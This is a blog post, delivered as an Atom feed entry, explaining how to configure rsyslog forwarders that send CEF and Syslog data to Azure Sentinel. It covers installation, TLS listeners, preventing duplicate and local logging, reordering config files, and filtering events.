&lt;h3 id=&quot;preventing-logging-of-remote-events-to-local-files&quot;&gt;Preventing logging of remote events to local files&lt;/h3&gt;

&lt;p&gt;One point that is always requested by customers is that after configuring machines to work as forwarder for CEF and/or Syslog is that local log files (often &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/messages&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/syslog&lt;/code&gt;) are being bloated with messages from remote servers, in most of the cases consuming all the available disk space in the volume where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log&lt;/code&gt; resides.&lt;/p&gt;

&lt;p&gt;This happens because the default definitions on the service, listed below, gets some facilities and severities stored in some local files without checking the source of the events (line comments and empty removed for simplicity).&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Note&lt;/strong&gt;: The location you can find this default configuration vary depending on your linux distribution. For Ubuntu there’s a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d/50-default.conf&lt;/code&gt; while for RHEL based distributions (RHEL, CentOS, Fedora) it is in the main &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Extracted from Ubuntu /etc/rsyslog.d/50-default.conf
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;auth,authpriv.*&lt;/span&gt;                 &lt;span class=&quot;err&quot;&gt;/var/log/auth.log&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*.*&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;auth,authpriv.none          -/var/log/syslog
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;kern.*&lt;/span&gt;                          &lt;span class=&quot;err&quot;&gt;-/var/log/kern.log&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;mail.*&lt;/span&gt;                          &lt;span class=&quot;err&quot;&gt;-/var/log/mail.log&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;mail.err&lt;/span&gt;                        &lt;span class=&quot;err&quot;&gt;/var/log/mail.err&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*.emerg&lt;/span&gt;                         &lt;span class=&quot;err&quot;&gt;:omusrmsg:*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, anything that matches those severities are sent to the specified local files. A quick way to prevent this issue is to edit your configuration file to accept only messages generated by localhost (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;):&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;fromhost-ip&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;= '127.0.0.1') then {&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;auth,authpriv.*&lt;/span&gt;                 &lt;span class=&quot;err&quot;&gt;/var/log/auth.log&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;*.*&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;auth,authpriv.none          -/var/log/syslog
&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;kern.*&lt;/span&gt;                          &lt;span class=&quot;err&quot;&gt;-/var/log/kern.log&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;mail.*&lt;/span&gt;                          &lt;span class=&quot;err&quot;&gt;-/var/log/mail.log&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;mail.err&lt;/span&gt;                        &lt;span class=&quot;err&quot;&gt;/var/log/mail.err&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;*.emerg&lt;/span&gt;                         &lt;span class=&quot;err&quot;&gt;:omusrmsg:*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;repeated-message-reduction&quot;&gt;Repeated message reduction&lt;/h3&gt;

&lt;p&gt;As remembered by my colleague &lt;a href=&quot;https://www.linkedin.com/in/flavio-honda/&quot;&gt;Flavio Honda&lt;/a&gt;, Rsyslog has an option that can help you reduce repeated messages.&lt;/p&gt;

&lt;p&gt;If you have trouble with this kind of situation or even wants to prevent this even before happen in the first time, you can enable the configuration below into your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt; file :smile:.&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$RepeatedMsgReduction&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;on&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Official reference about this feature in Rsyslog documentation can be found on &lt;a href=&quot;https://www.rsyslog.com/doc/master/configuration/action/rsconf1_repeatedmsgreduction.html&quot;&gt;this link&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;message-processing-flow&quot;&gt;Message processing flow&lt;/h3&gt;

&lt;p&gt;At rsyslog, the first file to be processed is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsyslog.conf&lt;/code&gt;, which normally contains an import to all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.conf&lt;/code&gt; inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d&lt;/code&gt; and the files are processed &lt;strong&gt;alphabetically&lt;/strong&gt;. When a message arrives or is generated in the system, it is forwarded and evaluated by each setting in the same order, unless we explicitly change this behavior.&lt;/p&gt;

&lt;p&gt;In the configuration below, let’s consider that we’re forwarding messages in CEF format from an appliance that comes with facility &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local4.info&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/IFykwc2.png&quot; alt=&quot;processing - initial configuration&quot; style=&quot;zoom:80%;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;If no changes were made to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsyslog.conf&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;50-default.conf&lt;/code&gt; to prevent logging from remote hosts, these messages will be stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/syslog&lt;/code&gt; file.&lt;/li&gt;
  &lt;li&gt;Also, if I there’s a match in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt; this message will be sent to Log Analytics workspace as raw Syslog.&lt;/li&gt;
  &lt;li&gt;And finally, it will match the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-config-omsagent.conf&lt;/code&gt; by the regex pattern and sent as CEF to the table &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonSecurityLog&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will not only result in full disk but also in double charging for this event, which will be stored twice in Log Analytics.&lt;/p&gt;

&lt;p&gt;To prevent this behavior, as Ofer Shezaf shared in one of the &lt;a href=&quot;https://aka.ms/securitywebinars&quot;&gt;Security Community Webinars&lt;/a&gt; (&lt;em&gt;Log Forwarder deep dive | Filtering CEF and Syslog events&lt;/em&gt;), we’ll rename the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-config-omsagent.conf&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;60-cef.conf&lt;/code&gt; so it can be processed &lt;strong&gt;before&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Also, we need to ensure that once the messages are forwarded to the CEF listener at TCP/25226 we’ll discard them, which can be done by the instruction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stop&lt;/code&gt;. &lt;strong&gt;Stop&lt;/strong&gt; drops the messages and they are no longer processed in the message flow.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Note&lt;/strong&gt;: You may find some variations of the stop instruction as a tilde (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~&lt;/code&gt;). This came from the legacy syslogd syntax&lt;/p&gt;

&lt;p&gt;The configuration will look like this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/rsyslog.d/60-cef.conf
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawmsg&lt;/span&gt; contains &lt;span class=&quot;s2&quot;&gt;&quot;CEF:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawmsg&lt;/span&gt; contains &lt;span class=&quot;s2&quot;&gt;&quot;ASA-&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     @@127.0.0.1:25226
        stop
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/cPteGGK.png&quot; alt=&quot;processing - reordering&quot; style=&quot;zoom:80%;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;adjusting-95-omsagentconf&quot;&gt;Adjusting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;After the initial installation, your MMA agent will create this file located at the configuration folder of your syslog daemon (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d/95-omsagent.conf&lt;/code&gt;) in sync with the settings you can define in the Azure Portal navigating to your Log Analytics workspace &amp;gt; Agents Configuration &amp;gt; Syslog:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UesHmCS.png&quot; alt=&quot;Log Analytics Agent Configurations - Syslog&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For the configuration above the content of this file will look like this:&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# OMS Syslog collection for workspace &amp;lt;workspace id&amp;gt;
&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;auth.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert;auth.=crit;auth.=debug;auth.=emerg;auth.=err;auth.=info;auth.=notice;auth.=warning  @127.0.0.1:25224&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;authpriv.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert;authpriv.=crit;authpriv.=debug;authpriv.=emerg;authpriv.=err;authpriv.=info;authpriv.=notice;authpriv.=warning  @127.0.0.1:25224&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;local3.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert;local3.=crit;local3.=debug;local3.=emerg;local3.=err;local3.=info;local3.=notice;local3.=warning  @127.0.0.1:25224&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;local4.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert;local4.=crit;local4.=debug;local4.=emerg;local4.=err;local4.=info;local4.=notice;local4.=warning  @127.0.0.1:25224&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Besides this configuration is extremely easy to set through the portal, it applies globally to all your Linux systems running omsagent connected to this workspace, ingesting more information you need into your Log Analytics workspace if more data type is selected than needed.&lt;/p&gt;

&lt;p&gt;If you need to set a different configuration to some machines like your forwarders, you are recommended to edit directly the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt; by adding or removing facilities from it as well as building your own criteria to send data to Azure but we need first prevent that this file be synchronized again with the definitions in the portal.&lt;/p&gt;

&lt;p&gt;The command below “breaks” the existing link between this file and the workspace configuration:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su omsagent &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'python /opt/microsoft/omsconfig/Scripts/OMS_MetaConfigHelper.py --disable'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The only thing that cannot be changed at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt; file is the forwarding instruction to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@127.0.0.1:25224&lt;/code&gt;.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Note&lt;/strong&gt;: In syslogd syntax a single at sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt;) means UDP while double at sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@&lt;/code&gt;) means TCP.&lt;/p&gt;

&lt;p class=&quot;notice--warning&quot;&gt;:warning: &lt;strong&gt;Warning&lt;/strong&gt;: In the previously mentioned Deep Dive CEF webinar, Ofer also recommend you change the omsagent configuration to accept messages using TCP. If you follow his recommendation, you also need to adjust any forwarding instruction to double at signs in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt; file, otherwise the messages won’t be sent to Log Analytics.&lt;/p&gt;

&lt;h3 id=&quot;filtering-out-events&quot;&gt;Filtering out events&lt;/h3&gt;

&lt;p&gt;If you’re still noticing ingestion of unnecessary events into your workspace, you can both implement the filter in the source as well in the forwarder, which is normally easier once most of the appliances don’t support much granularity on their configurations.&lt;/p&gt;

&lt;p&gt;An uncomplicated way to implement this is creating a file to be processed before the files &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;60-cef.conf&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt;, in this example named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;59-filter-out.conf&lt;/code&gt; but you can use whatever name you want but need to ensure they’ll be processed in the right order.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/tNsVYea.png&quot; alt=&quot;filtering out messages&quot; style=&quot;zoom:80%;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this file we’ll make use again of the instruction &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stop&lt;/code&gt;, dropping the messages we don’t want to be forwarder either to Syslog or CEF. The sample below drops any message containing “test” and matching one of the severities/facilities will be dropped.&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;($rawmsg&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;contains&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;test&quot;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;prifilt(&quot;auth,authpriv.*&quot;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;stop&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The rsyslog documentation is very rich on resources on &lt;a href=&quot;https://www.rsyslog.com/doc/master/configuration/filters.html&quot;&gt;how you can filter&lt;/a&gt; these messages as well as &lt;a href=&quot;https://www.rsyslog.com/doc/master/configuration/properties.html&quot;&gt;which properties&lt;/a&gt; you have available to build your instructions in a more advanced way, including tips on &lt;a href=&quot;https://www.rsyslog.com/doc/v8-stable/configuration/converting_to_new_format.html&quot;&gt;how to convert&lt;/a&gt; the instructions from syslogd syntax to the advanced, previously known as &lt;strong&gt;RainerScript&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Hope that this information helps you to properly deploy and maintain your CEF/Syslog forwarder infrastructure in your environment!&lt;/p&gt;

&lt;p&gt;Do you have an specific configuration or challenge in your environment not discussed here? Feel free to reach out on the comments so we can update this post in order to help others facing the same! :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Azure Sentinel" /><category term="Sentinel" /><category term="Syslog" /><category term="Rsyslog" /><category term="Linux" /><category term="Forwarder" /><category term="Collector" /><category term="CEF" /><summary type="html">Often I help customers on deploying CEF/Syslog forwarders in their environments to gather data from Network Appliances and/or other servers and services into Log Analytics, which is consequently available for Azure Sentinel. Besides having plenty documentation on how to do this deployment, as well as other community resources like Tech Community and Webinars, I have compiled all the resources I normally review with my customers during this deployment or revision in their environments. :newspaper: Edits: 30/04/2021 - Added section Repeated message reduction Requirements According to Microsoft’s official documentation, the requirement for this resource is quite simple as listed below: 4 CPUs and 8GB RAM, which is capable of handling up to 8500 EPS (events per second) using rsyslog, as stated in the docs. If you’re deploying this infrastructure in Azure you can use the SKU Standard_F4s_v2 which is compute optimized, recommended in this case. A Microsoft Monitoring Agent (aka omsagent) supported Linux distribution. Python version 2.7 or 3. One of the supported syslog daemons installed. The most common scenarios I came across uses rsyslog, once it normally is the default package for most of the distributions. Below I list the versions supported as stated in the docs: Rsyslog v8 Syslog-ng 2.1 - 3.22.1 Forwarder Architecture Forwarder architecture is simple: It is composed by one or more machines receiving the logs on syslog protocol over UDP, TCP or TLS. This is done by using rsyslog or syslog-ng daemon configurations, like any standard syslog server you might be already running in your environment. The received messages are forwarded to local listeners configured on omsagent to parse data as raw Syslog messages (UDP/25224) or CEF (TCP/25226). Messages are sent to Log Analytics Workspace according to its configuration, making them available to Sentinel. Now I’ll walk you through the detailed configuration of this service and sharing some tips of actions I have implemented along with some customers to mitigate some issues and reduce churn in their environment. Design considerations Before deploying/reviewing your forwarder infrastructure there are some questions you need to answer that will help you to properly define your configuration: Is this forwarder handling only CEF or Syslog messages or both log types? Besides both will be received through syslog protocol, CEF messages are parsed by omsagent according to its standard, making each field available in their own columns in Log Analytics while syslog messages are stored in a single column, requiring the proper parsing when inspecting the information contained on them. Also, if you’re using the forwarder for both purposes, we need to prevent that messages sent as CEF be also stored as Syslog, which will incur in double charging for your workspace. What are the facilities and severities, as well as message type and sources being forwarded to Sentinel? Over sending data to Sentinel can also be costly if you don’t filter them properly. Consider map the detection scenarios based in MITRE ATT&amp;amp;CK Matrix Techniques you’re hunting for before sending the data. This way you can avoid sending data without a purpose to your SIEM, which won’t give you any return over the investment made in the log storage and Sentinel analytics. What are the security requirements for this communication? As stated in this best practice post shared by Cristhofer Romeo Muñoz, TCP should be used as default protocol for every communication due to its reliability, unless your appliance only supports UDP or if you must use encryption in this communication, adopting TLS when this data is being sent over the Internet or you might have sensitive data being sent. Deploying the forwarder machine closer to the source also helps on reduce complexity on protocols used, as well as avoid performance issues caused by high latency between this communication. Installation The initial installation can be easily achieved by running the cef_installer.py from Official Github Repository using the command line below, which can be obtained for your environment by accessing the Common Event Format (CEF) connector page in Sentinel or simply by replacing the &amp;lt;workspace id&amp;gt; and &amp;lt;workspace secret&amp;gt; by yours. :bulb: Note: If you don’t have python 2.7 in your system you might need to replace python by python3 prior to executing the line below. sudo wget -O cef_installer.py https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/DataConnectors/CEF/cef_installer.py &amp;amp;&amp;amp; sudo python cef_installer.py &amp;lt;workspace id&amp;gt; &amp;lt;workspace secret&amp;gt; If your forwarder machine requires a proxy for communication, you need also to update proxy settings by modifying the /etc/opt/microsoft/omsagent/proxy.conf file: proxyconf=&quot;http://user:password@proxyserver:3128&quot; #user:password can be ignored if you proxy doesn't require authentication sudo echo $proxyconf &amp;gt;&amp;gt;/etc/opt/microsoft/omsagent/proxy.conf sudo chown omsagent:omiusers /etc/opt/microsoft/omsagent/proxy.conf #restart service sudo /opt/microsoft/omsagent/bin/service_control restart This install script performs the changes below to your system. Mostly of them requires connectivity to Github once the reference configurations are located at Azure Sentinel’s official repository: Download and install Microsoft Monitoring Agent for Linux. Configures omsagent to listen to TCP/25226 and properly handle CEF messages by copying the file security_events.conf under workspace configuration (/etc/opt/microsoft/omsagent/&amp;lt;workspaceID&amp;gt;/conf/omsagent.d). Forwards Messages matching ASA and CEF events to TCP/25226 by copying the file security-config-omsagent.conf to /etc/rsyslog.d/ or /etc/syslog-ng/conf.d/, depending on your syslog daemon. Enables syslog daemon to listen to TCP/514 e UDP/514 for inbound communication at /etc/rsyslog.conf or /etc/syslog-ng/syslog-ng.conf With this configuration you might be ready to forward the CEF messages to your machine, which will be sooner available in your Log Analytics workspace at CommonSecurityLog table but there are some other changes described here that you might benefit to collect also raw syslog messages, as well as implement further filtering and adjustment in this infrastructure. Configuration As we saw the log forwarder infrastructure is based in the syslog daemon + omsagent. As the rsyslog is one of the most popular daemons used, once it comes with most of the distributions today, I’ll be doing all configurations using it as reference, but you can easily adjust the syntax also for syslog-ng if necessary. Rsyslog version Check and install As stated in our docs we need to be running rsyslog v8. To confirm the running version on your system you can run the command rsyslogd -v, which will give an output like the example below: $ rsyslogd -v rsyslogd 8.32.0, compiled with: PLATFORM: x86_64-pc-linux-gnu PLATFORM (lsb_release -d): FEATURE_REGEXP: Yes GSSAPI Kerberos 5 support: Yes FEATURE_DEBUG (debug build, slow code): No 32bit Atomic operations supported: Yes 64bit Atomic operations supported: Yes memory allocator: system default Runtime Instrumentation (slow code): No uuid support: Yes systemd support: Yes Number of Bits in RainerScript integers: 64 According to the project documentation, you should be fine running the latest version provided by your distribution repository unless some bugfix is not backported to it. In this case you might need to download the latest build provided or install from source. Reloading rsyslog configuration After any change made to main rsyslog configuration file (/etc/rsyslog.conf) or any other file imported by it (normally located at /etc/rsyslog.d/*.conf) you need to restart the daemon so the changes are made effective. This can be achieved by running the command below: sudo systemctl restart rsyslog.service Adjusting rsyslog listeners Besides the cef_installer.py already defines a listener for TCP/514 and UDP/514, you might require additional configuration to encrypt communication using TLS. Your configuration for TCP and UDP should look like the sample below, which is an excerpt from file /etc/rsyslog.conf: module(load=&quot;imuxsock&quot;) # provides support for local system logging #module(load=&quot;immark&quot;) # provides --MARK-- message capability # provides UDP syslog reception module(load=&quot;imudp&quot;) input(type=&quot;imudp&quot; port=&quot;514&quot;) # provides TCP syslog reception module(load=&quot;imtcp&quot;) input(type=&quot;imtcp&quot; port=&quot;514&quot;) For TLS Configuration there’s some additional work required, where need to issue the certificates for servers and clients (if you’re not using an internal PKI) as well as make the required changes to rsyslog daemon to accept these encrypted communications. More details and sample configurations can be found in official documentation at this link, from where the excerpt below was extracted to give you an idea of how this configuration looks like: module(load=&quot;imuxsock&quot;) # local messages module(load=&quot;imtcp&quot; # TCP listener StreamDriver.Name=&quot;gtls&quot; StreamDriver.Mode=&quot;1&quot; # run driver in TLS-only mode StreamDriver.Authmode=&quot;anon&quot; ) # make gtls driver the default and set certificate files global( DefaultNetstreamDriver=&quot;gtls&quot; DefaultNetstreamDriverCAFile=&quot;/path/to/contrib/gnutls/ca.pem&quot; DefaultNetstreamDriverCertFile=&quot;/path/to/contrib/gnutls/cert.pem&quot; DefaultNetstreamDriverKeyFile=&quot;/path/to/contrib/gnutls/key.pem&quot; ) # start up listener at port 6514 input( type=&quot;imtcp&quot; port=&quot;6514&quot; ) Preventing logging of remote events to local files One point that is always requested by customers is that after configuring machines to work as forwarder for CEF and/or Syslog is that local log files (often /var/log/messages or /var/log/syslog) are being bloated with messages from remote servers, in most of the cases consuming all the available disk space in the volume where /var/log resides. This happens because the default definitions on the service, listed below, gets some facilities and severities stored in some local files without checking the source of the events (line comments and empty removed for simplicity). :bulb: Note: The location you can find this default configuration vary depending on your linux distribution. For Ubuntu there’s a file named /etc/rsyslog.d/50-default.conf while for RHEL based distributions (RHEL, CentOS, Fedora) it is in the main /etc/rsyslog.conf. #Extracted from Ubuntu /etc/rsyslog.d/50-default.conf auth,authpriv.* /var/log/auth.log *.*;auth,authpriv.none -/var/log/syslog kern.* -/var/log/kern.log mail.* -/var/log/mail.log mail.err /var/log/mail.err *.emerg :omusrmsg:* As you can see, anything that matches those severities are sent to the specified local files. A quick way to prevent this issue is to edit your configuration file to accept only messages generated by localhost (127.0.0.1): if ($fromhost-ip == '127.0.0.1') then { auth,authpriv.* /var/log/auth.log *.*;auth,authpriv.none -/var/log/syslog kern.* -/var/log/kern.log mail.* -/var/log/mail.log mail.err /var/log/mail.err *.emerg :omusrmsg:* } Repeated message reduction As remembered by my colleague Flavio Honda, Rsyslog has an option that can help you reduce repeated messages. If you have trouble with this kind of situation or even wants to prevent this even before happen in the first time, you can enable the configuration below into your /etc/rsyslog.conf file :smile:. $RepeatedMsgReduction on Official reference about this feature in Rsyslog documentation can be found on this link. Message processing flow At rsyslog, the first file to be processed is rsyslog.conf, which normally contains an import to all *.conf inside /etc/rsyslog.d and the files are processed alphabetically. When a message arrives or is generated in the system, it is forwarded and evaluated by each setting in the same order, unless we explicitly change this behavior. In the configuration below, let’s consider that we’re forwarding messages in CEF format from an appliance that comes with facility local4.info: If no changes were made to rsyslog.conf or 50-default.conf to prevent logging from remote hosts, these messages will be stored in the /var/log/syslog file. Also, if I there’s a match in 95-omsagent.conf this message will be sent to Log Analytics workspace as raw Syslog. And finally, it will match the security-config-omsagent.conf by the regex pattern and sent as CEF to the table CommonSecurityLog. This will not only result in full disk but also in double charging for this event, which will be stored twice in Log Analytics. To prevent this behavior, as Ofer Shezaf shared in one of the Security Community Webinars (Log Forwarder deep dive | Filtering CEF and Syslog events), we’ll rename the file security-config-omsagent.conf to 60-cef.conf so it can be processed before 95-omsagent.conf file. Also, we need to ensure that once the messages are forwarded to the CEF listener at TCP/25226 we’ll discard them, which can be done by the instruction stop. Stop drops the messages and they are no longer processed in the message flow. :bulb: Note: You may find some variations of the stop instruction as a tilde (~). This came from the legacy syslogd syntax The configuration will look like this: $ cat /etc/rsyslog.d/60-cef.conf if ($rawmsg contains &quot;CEF:&quot;) or ($rawmsg contains &quot;ASA-&quot;) then { *.* @@127.0.0.1:25226 stop } Adjusting 95-omsagent.conf After the initial installation, your MMA agent will create this file located at the configuration folder of your syslog daemon (/etc/rsyslog.d/95-omsagent.conf) in sync with the settings you can define in the Azure Portal navigating to your Log Analytics workspace &amp;gt; Agents Configuration &amp;gt; Syslog: For the configuration above the content of this file will look like this: # OMS Syslog collection for workspace &amp;lt;workspace id&amp;gt; auth.=alert;auth.=crit;auth.=debug;auth.=emerg;auth.=err;auth.=info;auth.=notice;auth.=warning @127.0.0.1:25224 authpriv.=alert;authpriv.=crit;authpriv.=debug;authpriv.=emerg;authpriv.=err;authpriv.=info;authpriv.=notice;authpriv.=warning @127.0.0.1:25224 local3.=alert;local3.=crit;local3.=debug;local3.=emerg;local3.=err;local3.=info;local3.=notice;local3.=warning @127.0.0.1:25224 local4.=alert;local4.=crit;local4.=debug;local4.=emerg;local4.=err;local4.=info;local4.=notice;local4.=warning @127.0.0.1:25224 Besides this configuration is extremely easy to set through the portal, it applies globally to all your Linux systems running omsagent connected to this workspace, ingesting more information you need into your Log Analytics workspace if more data type is selected than needed. If you need to set a different configuration to some machines like your forwarders, you are recommended to edit directly the 95-omsagent.conf by adding or removing facilities from it as well as building your own criteria to send data to Azure but we need first prevent that this file be synchronized again with the definitions in the portal. The command below “breaks” the existing link between this file and the workspace configuration: sudo su omsagent -c 'python /opt/microsoft/omsconfig/Scripts/OMS_MetaConfigHelper.py --disable' The only thing that cannot be changed at 95-omsagent.conf file is the forwarding instruction to @127.0.0.1:25224. :bulb: Note: In syslogd 